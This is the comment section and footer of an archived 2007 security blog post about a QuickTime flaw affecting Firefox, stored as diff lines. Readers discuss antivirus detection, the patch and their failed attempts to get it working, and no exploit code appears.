+		<img alt='' src='http://0.gravatar.com/avatar/ec38bd253cdd60abe4967a3f4653b0d2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">trustme</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51710">
+			September 23, 2007 at 8:17 am</a>		</div>
+
+		<p>Well. As of Sept 14th Symantec has this included in their AV defs as Bloodhound.Exploit.161</p>
+<p>Nice work on the exploit.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-53743">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bab6fb0e03bb6340e4954efecaa5da50?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">je</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53743">
+			September 29, 2007 at 4:37 pm</a>		</div>
+
+		<p>This was fixed with the release of version 2.0.0.7, though.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-61235">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f5051214d39cf67df9d53676d9b87c9c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://n/a' rel='external nofollow' class='url'>Oldboy</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-61235">
+			October 24, 2007 at 9:31 pm</a>		</div>
+
+		<p>Real through this vulnerability to load exe through the URL?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-66385">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0bd4c255fee76b1e723f9c24313cca02?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none-realignorantwindowsuser/' rel='external nofollow' class='url'>Francoise MAHENC</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-66385">
+			November 6, 2007 at 10:56 pm</a>		</div>
+
+		<p>What do I do now? One week ago, I got a Trojan, my Word documents were erratic, the Firewall antivirus detected nothing..MS were of no help beyond checking that my softwares were legal. I first got a paid Plus version of my AdAware, which promptly got erratic too, but detected and deleted a MRU. After I had tried to watch a YouTube [professional] video, I had noticed a QT icone come out of nowhere [my son installed iTunes on my laptop, which I never use - and Yes, I browse as an administrator, not knowing any better].  After AdAware, I also switched to Firefox, feeling fed-up with MS generally, and from checking on NoScript, I now got on your QT bug page &#8211; it tallies. WHAT DO I DO NOW? I guess this is of no interest to you [except as further proof on Windows users being morons!]but please direct me to people who can answer me: you are the only source of clear information I could get till now. Sorry to bother you, thank you for your activity &#8211; and thank you in advance if you can direct me. Francoise Mahenc</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-73920">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6d159328d8bd31d33a5b7a6f7e0cddf6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Assyren</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-73920">
+			November 19, 2007 at 9:46 pm</a>		</div>
+
+		<p>I&#8217;m using Windows XP sp2 IE but it&#8217;s not working the song 1.mp3 is runing but the calc.exe is not working i use this code </p>
+<p>what should i change so it will work ?<br />
+thanx</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-75869">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a714a516e55159f91fa1f12687349cdb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://n/A' rel='external nofollow' class='url'>pissedoff?</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-75869">
+			November 23, 2007 at 10:24 am</a>		</div>
+
+		<p>your beyonce is not malicious?what about this received by AV?:</p>
+<p>Threat: Bloodhound.Exploit.161</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-77760">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/17d6341e77fe4d53a943d53009d31e5a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tapasman</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-77760">
+			November 27, 2007 at 6:29 pm</a>		</div>
+
+		<p>sweet so none of these execute on my system,*shaking fist ala Homer* unless you have something hidden. thanks for the info and sorry you did not get credit for it. I know how you feel I have discovered close to 10 new unknown virueses and hacks and got no credit, oh well atleast my co-workers know.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-77761">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/17d6341e77fe4d53a943d53009d31e5a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tapasman</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-77761">
+			November 27, 2007 at 6:30 pm</a>		</div>
+
+		<p>opps IE 6 and QT 6.0</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115935">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ec2a23cd7415f3f45d113b74968b306b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://how-2-do.blogspot.com/' rel='external nofollow' class='url'>sachinKT</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115935">
+			March 5, 2008 at 7:33 pm</a>		</div>
+
+		<p>i dont know but some hacks are not working&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-118391">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/4e57c9f45beb0845b8810c68876ca1cd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">radioxid</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-118391">
+			April 8, 2008 at 2:05 pm</a>		</div>
+
+		<p>The alert doesn&#8217;t work anymore on FF 20013&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="453"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="fe447dfc8e" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/0day-quicktime-pwns-firefox/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:14:47 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
